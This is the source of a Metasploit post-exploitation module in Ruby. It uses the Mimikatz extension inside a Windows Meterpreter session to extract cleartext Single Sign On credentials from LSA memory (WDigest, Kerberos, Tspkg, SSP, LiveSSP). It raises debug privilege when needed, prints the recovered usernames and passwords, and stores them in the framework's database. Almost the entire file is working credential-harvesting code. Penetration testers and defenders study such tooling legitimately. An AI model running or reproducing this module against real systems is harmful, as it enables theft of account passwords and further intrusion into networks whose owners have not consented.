##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info(info,
      'Name'		 => 'Windows Single Sign On Credential Collector (Mimikatz)',
      'Description'	 => %q{
        This module will collect cleartext Single Sign On credentials from the Local
      Security Authority using the Mimikatz extension. Blank passwords will not be stored
      in the database.
          },
      'License'	 => MSF_LICENSE,
      'Author'	 => ['Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
      'Platform'	 => ['win'],
      'SessionTypes'	 => ['meterpreter' ]
    ))
  end

  def run
    if sysinfo.nil?
      print_error("This module is only available in a windows meterpreter session.")
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
      print_error("x64 platform requires x64 meterpreter and mimikatz extension")
      return
    end

    unless client.mimikatz
      vprint_status("Loading mimikatz extension...")
      begin
        client.core.use("mimikatz")
      rescue Errno::ENOENT
        print_error("This module is only available in a windows meterpreter session.")
        return
      end
    end

    unless is_system?
      vprint_warning("Not running as SYSTEM")
      debug = client.mimikatz.send_custom_command("privilege::debug")
      if debug =~ /Not all privileges or groups referenced are assigned to the caller/
        print_error("Unable to get Debug privilege")
        return
      else
        vprint_status("Retrieved Debug privilege")
      end
    end

    vprint_status("Retrieving WDigest")
    res = client.mimikatz.wdigest
    vprint_status("Retrieving Tspkg")
    res.concat client.mimikatz.tspkg
    vprint_status("Retrieving Kerberos")
    res.concat client.mimikatz.kerberos
    vprint_status("Retrieving SSP")
    res.concat client.mimikatz.ssp
    vprint_status("Retrieving LiveSSP")
    livessp = client.mimikatz.livessp
    unless livessp.first[:password] =~ /livessp KO/
      res.concat client.mimikatz.livessp
    else
      vprint_error("LiveSSP credentials not present")
    end

    table = Rex::Ui::Text::Table.new(
      'Header' => "Windows SSO Credentials",
      'Indent' => 0,
      'SortIndex' => 0,
      'Columns' =>
      [
        'AuthID', 'Package', 'Domain', 'User', 'Password'
      ]
    )

    unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values

    unique_results.each do |result|
      next if is_system_user? result[:user]
      table << [result[:authid], result[:package], result[:domain], result[:user], result[:password]]
      report_creds(result[:domain], result[:user], result[:password])
    end

    print_line table.to_s
  end

  def report_creds(domain, user, pass)
    return if (user.empty? or pass.empty?)

    if session.db_record
      source_id = session.db_record.id
    else
      source_id = nil
    end

    report_auth_info(
      :host  => session.session_host,
      :port => 445,
      :sname => 'smb',
      :proto => 'tcp',
      :source_id => source_id,
      :source_type => "exploit",
      :user => "#{domain}\\#{user}",
      :pass => pass
    )
  end

  def is_system_user?(user)
    system_users = [
      /^$/,
      /^DWM-\d$/,
      /^ASPNET$/,
      /^ASP\.NET V2\.0 Integrated$/,
      /^ANONYMOUS LOGON$/,
      /^IUSR.*/,
      /^IWAM.*/,
      /^IIS_WPG$/,
      /.*\$$/,
      /^LOCAL SERVICE$/,
      /^NETWORK SERVICE$/,
      /^LOCAL SYSTEM$/
    ]

    return system_users.find{|r| user.match(r)}
  end

end

